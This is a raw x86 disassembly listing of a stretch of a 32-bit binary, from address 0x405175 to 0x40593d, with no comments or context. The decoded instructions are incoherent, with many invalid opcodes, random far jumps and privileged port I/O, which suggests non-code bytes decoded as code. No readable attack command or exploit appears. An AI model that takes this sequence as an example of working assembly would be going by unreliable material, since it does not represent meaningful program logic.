  405175:	mov    ds:0x53d5b10,al
  40517a:	sub    ebx,DWORD PTR [edx-0x1d]
  40517d:	aas    
  40517e:	aas    
  40517f:	push   ss
  405180:	push   edi
  405181:	adc    cl,dl
  405183:	fwait
  405184:	inc    esp
  405185:	leave  
  405186:	and    BYTE PTR [ebp+0x50],0x8b
  40518a:	repz xchg edx,eax
  40518c:	or     DWORD PTR [eax],0xffffffd2
  40518f:	mov    al,0x2b
  405191:	adc    BYTE PTR [eax+0x4c],0xc1
  405195:	in     al,0x41
  405197:	mov    ebx,0xee95c21a
  40519c:	push   edi
  40519d:	loope  0x4051fd
  40519f:	out    dx,al
  4051a0:	stos   DWORD PTR es:[edi],eax
  4051a1:	xchg   edx,eax
  4051a2:	mov    ds:0xa14ceaf6,eax
  4051a7:	or     DWORD PTR [esi],eax
  4051a9:	jnp    0x4051e2
  4051ab:	adc    ebx,esp
  4051ad:	or     edi,0xffffffbb
  4051b0:	icebp  
  4051b1:	imul   edi,DWORD PTR [edi],0x64
  4051b4:	xor    eax,0xbad7c828
  4051b9:	lahf   
  4051ba:	inc    ebx
  4051bb:	pop    ecx
  4051bc:	test   DWORD PTR [edi-0x410e2fe5],0xd315b2db
  4051c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4051c7:	jmp    0x405227
  4051c9:	add    eax,0xd225e331
  4051ce:	jns    0x40515f
  4051d0:	imul   ecx,eax,0x3a5102ed
  4051d6:	jno    0x40517e
  4051d8:	and    al,0xd6
  4051da:	or     al,0x30
  4051dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051dd:	das    
  4051de:	xlat   BYTE PTR ds:[ebx]
  4051df:	mov    al,0x61
  4051e1:	sub    al,0x2e
  4051e3:	cmp    esi,ebp
  4051e5:	out    dx,al
  4051e6:	inc    esi
  4051e7:	pop    edx
  4051e8:	or     eax,0x48
  4051eb:	int    0x10
  4051ed:	fldenv [ebp+0x74]
  4051f0:	cmp    ch,BYTE PTR [esi+eax*8-0x1f]
  4051f4:	ror    DWORD PTR [ebx],1
  4051f6:	jge    0x4051ce
  4051f8:	data16 sar BYTE PTR [ecx],cl
  4051fb:	pop    ebp
  4051fc:	cli    
  4051fd:	push   cs
  4051fe:	jns    0x405257
  405200:	fwait
  405201:	test   BYTE PTR [edi-0x3fe7996e],0xdc
  405208:	jno    0x405269
  40520a:	ret    
  40520b:	xor    DWORD PTR [eax+0x16],0xcc101eb7
  405212:	call   0x4de4a4f2
  405217:	xchg   ecx,eax
  405218:	test   ebp,esi
  40521a:	(bad)  
  40521b:	dec    edi
  40521c:	ret    
  40521d:	xchg   ecx,eax
  40521e:	leave  
  40521f:	jne    0x405249
  405221:	in     al,0x8
  405223:	shr    BYTE PTR [eax+0xa],0x1c
  405227:	jae    0x4051de
  405229:	xor    eax,0x90a51f9f
  40522e:	dec    edx
  40522f:	test   esp,edx
  405231:	pop    ds
  405232:	sub    DWORD PTR [ebp+0x27],0xeb698f8b
  405239:	xchg   ebx,eax
  40523a:	fld    QWORD PTR [esi+esi*1]
  40523d:	hlt    
  40523e:	add    DWORD PTR [ebp+0x34],ebx
  405241:	mov    esp,0xfb85024e
  405246:	pop    ebx
  405247:	aaa    
  405248:	dec    ebp
  405249:	(bad)  
  40524a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40524b:	call   0x2ddf:0x3cc5c0d9
  405252:	push   0x1e
  405254:	int    0x8f
  405256:	sbb    eax,0x800cd58e
  40525b:	fistp  WORD PTR [eax-0x12c20802]
  405261:	jmp    0x9ff2:0x4d5a4519
  405268:	mov    ?,edx
  40526a:	fldenv [esi]
  40526c:	lods   eax,DWORD PTR ds:[esi]
  40526d:	loopne 0x405245
  40526f:	xor    al,0x3b
  405271:	push   ecx
  405272:	push   esi
  405273:	sbb    al,0xbc
  405275:	push   eax
  405277:	sub    ebx,0xfffffffa
  40527a:	adc    DWORD PTR ds:0x96c4b244,ebx
  405280:	adc    edx,DWORD PTR [edi-0x32]
  405283:	or     cl,BYTE PTR [esp+eax*8-0xe58ef4d]
  40528a:	mov    ch,dl
  40528c:	or     dh,ch
  40528e:	sti    
  40528f:	mov    ah,0x13
  405291:	ss loope 0x405220
  405294:	jbe    0x40530b
  405296:	hlt    
  405297:	mov    esi,0x5645dac3
  40529c:	fisttp QWORD PTR [ebp+0x4a40ffc5]
  4052a2:	call   0x94cc8b8b
  4052a7:	iret   
  4052a8:	fdiv   st,st(4)
  4052aa:	sti    
  4052ab:	lods   eax,DWORD PTR cs:[esi]
  4052ad:	jp     0x405240
  4052af:	icebp  
  4052b0:	adc    eax,0xff3c681f
  4052b5:	push   ds
  4052b6:	inc    esi
  4052b7:	mov    al,ds:0x314323c6
  4052bc:	(bad)  
  4052bd:	mov    BYTE PTR [edi-0x55b1b395],bl
  4052c3:	mov    ah,0x18
  4052c5:	rcr    dh,cl
  4052c7:	ins    DWORD PTR es:[edi],dx
  4052c8:	ret    
  4052c9:	lds    esi,FWORD PTR [esi+0x75]
  4052cc:	sub    BYTE PTR [ebp+0x6ba6e052],dl
  4052d2:	(bad)  
  4052d3:	jae    0x405311
  4052d5:	test   eax,0x1b369c61
  4052da:	jno    0x40526a
  4052dc:	sub    eax,0xcdf37c8b
  4052e1:	iret   
  4052e2:	jns    0x405327
  4052e4:	enter  0xbd0b,0x86
  4052e8:	rcr    bh,cl
  4052ea:	xchg   edx,eax
  4052eb:	pop    ecx
  4052ec:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052ee:	push   esp
  4052ef:	ins    BYTE PTR es:[edi],dx
  4052f0:	mov    al,ds:0x9a2bddeb
  4052f5:	mov    bl,0x22
  4052f7:	sar    bl,0xf7
  4052fa:	cwde   
  4052fb:	jno    0x40528d
  4052fd:	pop    ebx
  4052fe:	xchg   ebx,eax
  4052ff:	inc    edx
  405300:	jno    0x405381
  405302:	daa    
  405303:	sti    
  405304:	push   ds
  405305:	inc    edx
  405306:	mov    cl,al
  405308:	pop    eax
  405309:	shl    DWORD PTR [esi-0x31eeedf3],0xe7
  405310:	mov    cl,0x6e
  405312:	push   ds
  405313:	jl     0x4052bf
  405315:	out    dx,al
  405316:	pop    eax
  405317:	sbb    dh,BYTE PTR [ecx-0x40]
  40531a:	mov    eax,ds:0x3a8fa203
  40531f:	fiadd  WORD PTR [eax]
  405321:	test   DWORD PTR [edi],ebp
  405323:	call   0x452b:0xfd2f728f
  40532a:	mov    ebx,0x6999b8e5
  40532f:	fs data16 add ah,dl
  405333:	sub    dl,ch
  405335:	mov    ebp,0x70d07bc8
  40533a:	push   esi
  40533b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40533c:	push   esi
  40533d:	ins    DWORD PTR es:[edi],dx
  40533e:	sahf   
  40533f:	sub    BYTE PTR [eax+0x1f],ah
  405342:	dec    ecx
  405343:	stos   DWORD PTR es:[edi],eax
  405344:	xchg   ebp,eax
  405345:	and    ecx,DWORD PTR [ebp+0x1a89c3b9]
  40534b:	mov    edi,0xe20ab328
  405350:	addr16 adc eax,0x5ebb23d0
  405356:	(bad)  
  405358:	mov    cl,0x17
  40535a:	cmp    al,0x79
  40535c:	sub    eax,0x4f30d574
  405361:	mov    ds:0xc44f58de,al
  405366:	and    DWORD PTR [ebx+0x72],edx
  405369:	inc    esp
  40536a:	jnp    0x40538d
  40536c:	jnp    0x4052f6
  40536e:	shl    DWORD PTR [edx],0x3
  405371:	int    0x7d
  405373:	and    al,0x43
  405375:	push   ds
  405376:	dec    eax
  405377:	scas   eax,DWORD PTR es:[edi]
  405378:	gs lock pop es
  40537b:	out    dx,ax
  40537d:	jo     0x4053a3
  40537f:	mov    bl,BYTE PTR ds:[eax]
  405382:	int3   
  405383:	in     al,dx
  405384:	out    dx,al
  405385:	mov    cl,BYTE PTR [ebx-0x44ee339a]
  40538b:	cmp    BYTE PTR [edi+ebx*8+0x7a],0xda
  405390:	xor    al,0x43
  405392:	outs   dx,DWORD PTR ds:[esi]
  405393:	and    DWORD PTR [edx],0x28
  405396:	and    eax,esp
  405398:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405399:	xchg   ecx,eax
  40539a:	mov    bl,0xef
  40539c:	lods   al,BYTE PTR ds:[si]
  40539e:	xchg   ebx,eax
  40539f:	pop    esp
  4053a0:	push   cs
  4053a1:	call   0x47b6:0xb20dfb96
  4053a8:	and    al,0x36
  4053aa:	(bad)  
  4053ab:	or     al,0x51
  4053ad:	xchg   esp,eax
  4053ae:	pusha  
  4053af:	xchg   DWORD PTR [eax+0x65],ecx
  4053b2:	jp     0x4053d2
  4053b4:	xchg   edx,eax
  4053b5:	gs or  eax,0xfdc843df
  4053bb:	fsubr  QWORD PTR [esi+0x13f64d11]
  4053c1:	pop    DWORD PTR [eax+0x76]
  4053c4:	je     0x405391
  4053c6:	dec    eax
  4053c7:	popf   
  4053c8:	pop    ebp
  4053c9:	mov    WORD PTR [edx+0x468841b4],es
  4053cf:	sub    al,0x92
  4053d1:	out    dx,eax
  4053d2:	(bad)  
  4053d3:	cmc    
  4053d4:	push   cs
  4053d5:	jmp    0x90a9:0x80f483e7
  4053dc:	and    al,BYTE PTR [ebx-0x3cf12377]
  4053e2:	std    
  4053e3:	mov    ecx,0xa00f7cc3
  4053e8:	xor    BYTE PTR [edi],ah
  4053ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053eb:	push   0xcfe2c511
  4053f0:	dec    eax
  4053f1:	in     eax,0x1e
  4053f3:	leave  
  4053f4:	inc    edi
  4053f5:	jmp    0x4053ff
  4053f7:	mov    ds,WORD PTR [ecx]
  4053f9:	mov    ebp,0x7c285e14
  4053fe:	pop    ecx
  4053ff:	xor    DWORD PTR [ecx+eax*8],ecx
  405402:	sahf   
  405403:	fisubr DWORD PTR [ecx+0x266149a8]
  405409:	cmp    eax,0x93819d74
  40540e:	sbb    al,0x97
  405410:	inc    ebx
  405411:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405412:	call   0x6b08:0x94266cfc
  405419:	push   eax
  40541a:	loop   0x40542b
  40541c:	sub    ecx,DWORD PTR [ecx-0x7ed28596]
  405422:	xchg   edx,eax
  405423:	fadd   QWORD PTR [eax-0x66f5f42]
  405429:	pusha  
  40542a:	sub    BYTE PTR [edi],bh
  40542c:	in     al,0xd
  40542e:	push   0xe0b3afa
  405433:	cmp    BYTE PTR ds:0xeeaa6e6d,bl
  405439:	sub    ch,0x52
  40543c:	sub    bl,bl
  40543e:	ins    BYTE PTR es:[edi],dx
  40543f:	pusha  
  405440:	leave  
  405441:	cmp    al,0xa7
  405443:	aas    
  405444:	xchg   DWORD PTR [edx],ebp
  405446:	mov    ebx,0xca69888c
  40544b:	icebp  
  40544c:	push   ds
  40544d:	push   ds
  40544e:	inc    bp
  405450:	pop    edx
  405451:	push   ebp
  405452:	dec    edi
  405453:	cld    
  405454:	aaa    
  405455:	cmp    ebp,esp
  405457:	inc    esi
  405458:	push   ecx
  405459:	adc    DWORD PTR [edi-0x5042140f],0xffffffb2
  405460:	cwde   
  405461:	stc    
  405462:	xchg   edi,eax
  405463:	push   cs
  405464:	fcomp  QWORD PTR [ebp+0x14d68bd8]
  40546a:	in     al,0xdc
  40546c:	shl    eax,cl
  40546e:	sub    ah,dl
  405470:	dec    edi
  405471:	jl     0x405442
  405473:	outs   dx,BYTE PTR ds:[esi]
  405474:	mov    bl,0x10
  405476:	test   al,0xec
  405478:	or     DWORD PTR ds:0x95ab5442,ebx
  40547e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40547f:	lahf   
  405480:	inc    ebp
  405481:	cmp    ah,bl
  405483:	sbb    eax,0xc5850a6c
  405488:	ret    
  405489:	mov    al,ds:0xcf9e1e4f
  40548e:	sub    ecx,esp
  405490:	jae    0x405444
  405492:	xchg   edi,eax
  405493:	xchg   ecx,eax
  405494:	xor    DWORD PTR [eax+0x379e535f],ebp
  40549a:	push   ecx
  40549b:	adc    cl,bl
  40549d:	cmc    
  40549e:	adc    dh,BYTE PTR [ebp-0x89cb00a]
  4054a4:	jns    0x405431
  4054a6:	xor    cl,BYTE PTR [edx-0x11]
  4054a9:	ins    BYTE PTR es:[edi],dx
  4054aa:	sub    eax,0x4a722a03
  4054af:	repz out dx,al
  4054b1:	stos   DWORD PTR es:[edi],eax
  4054b2:	sbb    eax,0xe44cc6d7
  4054b7:	pop    eax
  4054b8:	pop    ds
  4054b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054ba:	jge    0x4054bd
  4054bc:	test   DWORD PTR [ebx],ebx
  4054be:	sbb    BYTE PTR [eax],dh
  4054c0:	push   ds
  4054c1:	(bad)  
  4054c2:	xchg   DWORD PTR ss:[edi+0x17],esp
  4054c6:	ret    0xd2c
  4054c9:	in     eax,0x3
  4054cb:	xchg   edx,eax
  4054cc:	push   ecx
  4054cd:	add    DWORD PTR [ecx+0x6f],ebx
  4054d0:	push   ss
  4054d1:	jecxz  0x405519
  4054d3:	mov    DWORD PTR [edx],eax
  4054d5:	fidiv  WORD PTR [esi+eax*2+0x7824c095]
  4054dc:	adc    DWORD PTR [ebx],0xfffffff6
  4054df:	mov    al,0xf7
  4054e1:	jnp    0x4054d8
  4054e3:	fiadd  WORD PTR [edi-0x64621996]
  4054e9:	fistp  WORD PTR [eax+0x76]
  4054ec:	pop    ecx
  4054ed:	push   esi
  4054ee:	inc    edx
  4054ef:	sti    
  4054f0:	addr16 dec esp
  4054f2:	repz mov bl,0x77
  4054f5:	enter  0x11c7,0xba
  4054f9:	mov    edi,0xbbf90742
  4054fe:	sbb    BYTE PTR [ebx-0x2d6e9e12],ah
  405504:	jmp    0x4054ea
  405506:	in     eax,dx
  405507:	fimul  WORD PTR [edx]
  405509:	loop   0x4054fb
  40550b:	imul   ebp,DWORD PTR [ebp+0x59bdb571],0x55
  405512:	lock lea esi,[ebx-0x42b57356]
  405519:	fmul   QWORD PTR [edx]
  40551b:	xchg   ecx,eax
  40551c:	and    al,bl
  40551e:	adc    DWORD PTR [eax-0xdaceb04],esi
  405524:	lea    edi,[ebx+0x6e]
  405527:	mov    WORD PTR [eax+0x45],es
  40552a:	pop    ds
  40552b:	scas   al,BYTE PTR es:[edi]
  40552c:	xchg   edi,eax
  40552d:	xor    cl,dh
  40552f:	mov    bh,0x19
  405531:	pop    ebp
  405532:	add    eax,0x5c85f988
  405537:	(bad)  
  405538:	cmp    eax,0x4ac69b4f
  40553d:	cmp    al,0x24
  40553f:	out    dx,eax
  405540:	inc    ebx
  405541:	imul   esp,DWORD PTR [edi],0x9906e007
  405547:	js     0x405530
  405549:	mov    ebx,0x38f37b3e
  40554e:	mov    ds:0xd6ec41f5,al
  405553:	xchg   edx,eax
  405554:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405555:	jnp    0x40556f
  405557:	shl    DWORD PTR [edi-0x5927c1a0],cl
  40555d:	pusha  
  40555e:	sahf   
  40555f:	jns    0x4055a6
  405561:	std    
  405562:	xchg   esi,eax
  405563:	push   es
  405564:	mov    dl,0x74
  405566:	jbe    0x4054e8
  405568:	int3   
  405569:	adc    BYTE PTR [ecx+edx*2-0x8],ch
  40556d:	fisttp WORD PTR [eax-0x55]
  405570:	sub    DWORD PTR [eax*1+0x498393e],esp
  405577:	cmp    ecx,DWORD PTR [edx+edi*2]
  40557a:	pop    ebx
  40557b:	xchg   esp,eax
  40557c:	sbb    al,0xec
  40557e:	sbb    al,0xc2
  405580:	ds int3 
  405582:	test   al,0xbe
  405584:	xchg   esp,eax
  405585:	xchg   DWORD PTR [eax],edx
  405587:	mov    ch,0xf4
  405589:	xor    edi,edi
  40558b:	ret    
  40558c:	fdivr  DWORD PTR [edi+0x165e5e45]
  405592:	retf   0xf95a
  405595:	enter  0x823d,0xf4
  405599:	cli    
  40559a:	dec    edi
  40559b:	push   edx
  40559c:	adc    esi,DWORD PTR [ebx-0x58]
  40559f:	xchg   esi,eax
  4055a0:	out    0x6,eax
  4055a2:	nop
  4055a3:	and    al,0x70
  4055a5:	mov    esi,0xa0bb5386
  4055aa:	xchg   ecx,eax
  4055ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055ac:	inc    ebp
  4055ad:	add    dh,ah
  4055af:	mov    BYTE PTR [ebx+0x3006aea1],al
  4055b5:	cwde   
  4055b6:	jno    0x40559e
  4055b8:	push   edi
  4055b9:	stos   DWORD PTR es:[edi],eax
  4055ba:	inc    ecx
  4055bb:	popa   
  4055bc:	call   0xd942b3fb
  4055c1:	sti    
  4055c2:	es add eax,edx
  4055c5:	adc    eax,0x64dc94c6
  4055ca:	icebp  
  4055cb:	add    eax,0xbce3abc7
  4055d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055d1:	xor    al,0xbd
  4055d3:	test   ecx,0x43e61860
  4055d9:	jae    0x4055e5
  4055db:	pusha  
  4055dc:	adc    al,0xa9
  4055df:	push   ebp
  4055e0:	into   
  4055e1:	dec    ebx
  4055e2:	dec    esp
  4055e3:	lahf   
  4055e4:	xor    al,0x96
  4055e6:	pop    edi
  4055e7:	mov    ch,al
  4055e9:	jbe    0x4055b2
  4055eb:	xor    al,0xc0
  4055ed:	push   ebx
  4055ee:	push   ebx
  4055ef:	or     ah,al
  4055f1:	xor    al,0x68
  4055f3:	sahf   
  4055f4:	lock sbb DWORD PTR [eax],ebx
  4055f7:	imul   esp,ebp,0x69
  4055fa:	inc    eax
  4055fb:	shl    DWORD PTR [esi+0x7e63c018],0x16
  405602:	sti    
  405603:	sbb    al,0xc7
  405605:	dec    eax
  405606:	add    BYTE PTR [edx],0xbf
  405609:	pop    esp
  40560a:	mov    esp,0x7a85cb61
  40560f:	sahf   
  405610:	repnz sub edx,0x7762697
  405617:	ret    
  405618:	mov    esp,0xefb4fa7d
  40561d:	rcr    BYTE PTR [ebp+ebx*2-0x4e8ebdd9],cl
  405624:	mov    eax,0x98d409e2
  405629:	push   ss
  40562a:	cwde   
  40562b:	or     BYTE PTR [eax+esi*8-0x2fc9f038],ch
  405632:	mov    al,0x59
  405634:	std    
  405635:	fdivr  DWORD PTR [eax+0x14648359]
  40563b:	into   
  40563c:	jbe    0x405612
  40563e:	outs   dx,BYTE PTR ds:[esi]
  40563f:	les    esp,FWORD PTR [esi-0x4]
  405642:	mov    dh,BYTE PTR [ebx-0x7b]
  405645:	mov    edx,0x66c47c5c
  40564a:	cdq    
  40564b:	or     al,0xd1
  40564d:	and    al,0xa0
  40564f:	(bad)  
  405650:	adc    edx,DWORD PTR [eax+edi*1]
  405653:	xlat   BYTE PTR ds:[ebx]
  405654:	cmp    esp,DWORD PTR [edi]
  405656:	jbe    0x4056b9
  405658:	gs repz loope 0x405681
  40565c:	(bad)  
  40565d:	scas   eax,DWORD PTR es:[edi]
  40565e:	or     eax,0x64ffb521
  405663:	ret    0xae99
  405666:	jae    0x4055ef
  405668:	dec    ecx
  405669:	mov    al,0xb0
  40566b:	sbb    cl,bl
  40566d:	repnz es out dx,eax
  405670:	repnz jecxz 0x405642
  405673:	push   es
  405674:	xchg   DWORD PTR [ecx+0x1e],eax
  405677:	or     BYTE PTR [edx+edx*2+0x3f0de39d],dh
  40567e:	fimul  WORD PTR [ebx-0x3b88d03c]
  405684:	pop    edx
  405685:	sub    al,0x72
  405687:	sub    edi,DWORD PTR [ebp-0x65]
  40568a:	mov    dh,BYTE PTR [edx+0x38]
  40568d:	sar    BYTE PTR [ebp-0x61],0xb9
  405691:	xchg   dl,ch
  405693:	inc    ebp
  405694:	cld    
  405695:	out    dx,eax
  405696:	rol    edx,cl
  405698:	jge    0x4056ed
  40569a:	pop    esp
  40569b:	pop    ds
  40569c:	sti    
  40569d:	sar    DWORD PTR [edi-0x40],1
  4056a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056a1:	(bad)  
  4056a2:	jmp    0xa88931f7
  4056a7:	fdivr  QWORD PTR [edi+0x6881d78b]
  4056ad:	dec    eax
  4056ae:	loope  0x405702
  4056b0:	mov    al,0x6
  4056b2:	jns    0x4056e6
  4056b4:	nop
  4056b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056b6:	inc    eax
  4056b7:	enter  0xae65,0x6e
  4056bb:	lahf   
  4056bc:	std    
  4056bd:	xor    al,BYTE PTR [ebx-0x69db19c7]
  4056c3:	push   ebp
  4056c4:	inc    ebx
  4056c5:	lods   al,BYTE PTR ds:[esi]
  4056c6:	pop    edi
  4056c7:	sub    al,0xfa
  4056c9:	inc    edi
  4056ca:	mov    edi,DWORD PTR [ebp+0x41]
  4056cd:	call   FWORD PTR [ebx]
  4056cf:	fmul   DWORD PTR [ebx+0x16034d1b]
  4056d5:	push   cs
  4056d6:	adc    eax,0x5a0f133
  4056db:	dec    eax
  4056dc:	mov    esi,0x21e38bd
  4056e1:	cmp    al,0x24
  4056e3:	cld    
  4056e4:	ror    DWORD PTR [esi+ebx*1+0x61910172],0xc7
  4056ec:	in     eax,dx
  4056ed:	out    0xac,al
  4056ef:	ss ins BYTE PTR es:[edi],dx
  4056f1:	div    DWORD PTR [edx+0x677166e3]
  4056f7:	adc    al,0x8c
  4056f9:	(bad)  
  4056fa:	aad    0x7a
  4056fc:	jb     0x405732
  4056fe:	inc    esi
  4056ff:	jg     0x4056e9
  405701:	loop   0x405729
  405703:	add    edi,edi
  405705:	mov    BYTE PTR [ebp-0x73],dl
  405708:	je     0x40574a
  40570a:	and    ch,BYTE PTR [esi-0xa]
  40570d:	mov    dl,0x16
  40570f:	xor    ecx,edx
  405711:	add    DWORD PTR [esp+ecx*2+0x5e278485],esi
  405718:	mov    dl,0x76
  40571a:	adc    edi,DWORD PTR [eax]
  40571c:	or     dh,0x8d
  40571f:	mov    dl,0xdb
  405721:	sahf   
  405722:	call   0x6826:0x3724ac1f
  405729:	pop    ebp
  40572a:	outs   dx,BYTE PTR ds:[esi]
  40572b:	shl    DWORD PTR [esp+edx*2+0x4981063c],1
  405732:	mov    eax,ds:0xd39c66a5
  405737:	push   esi
  405738:	xlat   BYTE PTR ds:[ebx]
  405739:	(bad)  
  40573a:	add    bh,BYTE PTR [edi+eax*1-0xb]
  40573e:	std    
  40573f:	pop    ecx
  405740:	test   bl,ch
  405742:	call   0x28b7:0xe8f2a885
  405749:	adc    DWORD PTR [edi+0x10],edi
  40574c:	dec    DWORD PTR [esi]
  40574e:	mov    al,ds:0x7382aa8e
  405753:	pop    esi
  405754:	push   edi
  405755:	addr16 loop 0x405793
  405758:	xor    cl,BYTE PTR [edi-0x15]
  40575b:	xchg   ch,dh
  40575d:	dec    esi
  40575e:	in     al,0xf1
  405760:	pop    ebx
  405761:	mov    eax,ds:0x6757ca85
  405766:	sti    
  405767:	mov    edx,0xb0793a6
  40576c:	int3   
  40576d:	or     BYTE PTR gs:[ecx+0x40d42949],bh
  405774:	ret    
  405775:	jb     0x4057a8
  405777:	pinsrw mm6,WORD PTR [edx+0x2311edcd],0x28
  40577f:	ret    
  405780:	inc    ecx
  405781:	inc    eax
  405782:	push   edx
  405783:	int3   
  405784:	and    edi,edx
  405786:	jne    0x405715
  405788:	or     al,0x9d
  40578a:	addr16 xchg ebp,eax
  40578c:	mov    al,ds:0x2563229c
  405791:	push   ss
  405792:	nop
  405793:	outs   dx,BYTE PTR ds:[esi]
  405794:	xor    dl,bh
  405796:	call   0xf3d2:0x6d8d6521
  40579d:	cmc    
  40579e:	hlt    
  40579f:	test   BYTE PTR [esi+eax*2],ch
  4057a2:	into   
  4057a3:	dec    sp
  4057a5:	cwde   
  4057a6:	pusha  
  4057a7:	sbb    ch,BYTE PTR [eax]
  4057a9:	iret   
  4057aa:	adc    ecx,esp
  4057ac:	inc    eax
  4057ad:	cmp    edi,0x126e334
  4057b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057b4:	jge    0x40581a
  4057b6:	push   cs
  4057b7:	mov    cl,0xbd
  4057b9:	cmp    bl,0xe3
  4057bc:	or     eax,0x43d0a8b2
  4057c1:	and    DWORD PTR [ebp+0x6dd58e6e],0xe3091d54
  4057cb:	sbb    BYTE PTR [ebp+0x7f],0xb2
  4057cf:	test   BYTE PTR [eax-0x62],bl
  4057d2:	pop    ebx
  4057d3:	pop    es
  4057d4:	fimul  DWORD PTR [edi-0x77ee56ab]
  4057da:	push   ebp
  4057db:	fdivr  QWORD PTR ds:0x84340740
  4057e1:	out    dx,eax
  4057e2:	push   esi
  4057e3:	rcr    BYTE PTR [eax],cl
  4057e5:	sub    cl,ch
  4057e7:	mov    al,0x2a
  4057e9:	xlat   BYTE PTR ds:[ebx]
  4057ea:	mov    ecx,edx
  4057ec:	imul   edx,edi,0x3d753857
  4057f2:	push   eax
  4057f3:	mov    DWORD PTR [ebx-0x1c151aa1],eax
  4057f9:	test   eax,0xb955ba49
  4057fe:	mov    bl,0x95
  405800:	pop    edx
  405801:	jmp    0x5a37:0xfcb2fd72
  405808:	sub    bl,BYTE PTR [bx]
  40580b:	sti    
  40580c:	mov    ecx,0xee9c64d5
  405811:	idiv   DWORD PTR [ebp+0x390bfc6f]
  405817:	pop    ebp
  405818:	mov    DWORD PTR [ecx+0x6f],esi
  40581b:	dec    edx
  40581c:	push   esp
  40581d:	and    al,0xb0
  40581f:	in     eax,dx
  405820:	mov    cs,WORD PTR [ebp+0xe974279]
  405826:	jmp    DWORD PTR [edx-0x7230784d]
  40582c:	cmp    ebx,DWORD PTR [ebp-0x40]
  40582f:	loopne 0x4057ef
  405831:	sub    al,0xa0
  405833:	mov    DWORD PTR [ebx-0x8],eax
  405836:	in     al,0x13
  405838:	jno    0x4058a0
  40583a:	cld    
  40583b:	jnp    0x4057ec
  40583d:	mov    ch,0x8c
  40583f:	inc    eax
  405840:	sub    eax,0xc9f037b9
  405845:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405846:	cmp    bl,BYTE PTR [esi-0x4f]
  405849:	and    eax,0x456590e3
  40584e:	std    
  40584f:	lods   eax,DWORD PTR ds:[esi]
  405850:	in     eax,dx
  405851:	sbb    eax,0x85c6477
  405856:	dec    ebp
  405857:	in     al,dx
  405858:	or     DWORD PTR [edx],eax
  40585a:	xor    BYTE PTR [ebx+0x3f],ch
  40585d:	and    edi,ebp
  40585f:	mov    cl,0x74
  405861:	cmc    
  405862:	lahf   
  405863:	loop   0x405837
  405865:	div    BYTE PTR [esi+0x4f]
  405868:	nop
  405869:	dec    eax
  40586a:	clc    
  40586b:	adc    eax,DWORD PTR [eax+0x42fbd3d5]
  405871:	(bad)  
  405872:	(bad)  
  405873:	mov    esi,0xd87f0379
  405878:	cli    
  405879:	dec    esp
  40587a:	repnz (bad) 
  40587c:	out    dx,eax
  40587d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40587e:	leave  
  40587f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405880:	mov    DWORD PTR [eax],eax
  405882:	sbb    DWORD PTR [edx+edi*2],ecx
  405885:	pop    ds
  405886:	mov    dl,0x13
  405888:	hlt    
  405889:	jnp    0x405853
  40588b:	and    eax,0x2c2aa637
  405890:	or     DWORD PTR [esi+0x23],edi
  405893:	or     ebp,DWORD PTR ss:[edx+0x3249dced]
  40589a:	dec    esi
  40589b:	mov    ebp,0x15c20169
  4058a0:	sti    
  4058a1:	rcr    ah,0xc0
  4058a4:	in     al,0x78
  4058a6:	lods   eax,DWORD PTR ds:[esi]
  4058a7:	mov    cl,0xb9
  4058a9:	aas    
  4058aa:	pop    ds
  4058ab:	dec    ebp
  4058ac:	sbb    bl,ch
  4058ae:	jno    0x405916
  4058b0:	ins    BYTE PTR es:[edi],dx
  4058b1:	dec    ebp
  4058b2:	pop    esi
  4058b3:	scas   al,BYTE PTR es:[edi]
  4058b4:	in     eax,0x46
  4058b6:	daa    
  4058b7:	mov    esi,DWORD PTR [ecx+0x4d5242e7]
  4058bd:	jae    0x40587b
  4058bf:	repnz sbb BYTE PTR [ebp-0x5bc7a662],0x48
  4058c7:	stc    
  4058c8:	sahf   
  4058c9:	sahf   
  4058ca:	xchg   ebx,eax
  4058cb:	sbb    al,0x6b
  4058cd:	sbb    DWORD PTR [esi-0x3b7c605],0xf00954ad
  4058d7:	ins    BYTE PTR es:[edi],dx
  4058d8:	cli    
  4058d9:	jge    0x4058fc
  4058db:	or     ch,BYTE PTR [ebx+0x4ba9a0fd]
  4058e1:	add    ebp,DWORD PTR [edx+0xe]
  4058e4:	sub    cl,BYTE PTR [edi+0x62baae45]
  4058ea:	jnp    0x405898
  4058ec:	stos   DWORD PTR es:[edi],eax
  4058ed:	cwde   
  4058ee:	jp     0x40592e
  4058f0:	cwde   
  4058f1:	(bad)  
  4058f3:	inc    ebp
  4058f4:	jg     0x405925
  4058f6:	mov    ax,0x936e
  4058fa:	ror    DWORD PTR [edi],cl
  4058fc:	and    esi,0x25e183f7
  405902:	leave  
  405903:	sbb    ah,bh
  405905:	sbb    dl,cl
  405907:	xor    ebx,ebx
  405909:	xor    DWORD PTR [eax-0x2e],ebp
  40590c:	sbb    dl,BYTE PTR [esi]
  40590e:	push   cs
  40590f:	sub    al,0xb7
  405911:	xchg   edx,eax
  405912:	pmaddwd mm5,QWORD PTR [ebp+0x22646ed2]
  405919:	imul   edx,ebp,0xe725981b
  40591f:	and    ah,BYTE PTR [eax-0x7a]
  405922:	cld    
  405923:	fiadd  WORD PTR [ebx+0x16]
  405926:	dec    ebp
  405927:	js     0x405927
  405929:	(bad)  [ecx-0x6e]
  40592c:	mov    WORD PTR [edi-0x1f360137],es
  405932:	adc    dl,BYTE PTR [edx-0x59fe3f23]
  405938:	mov    ds:0x13cb770d,eax
  40593d:	cwde   
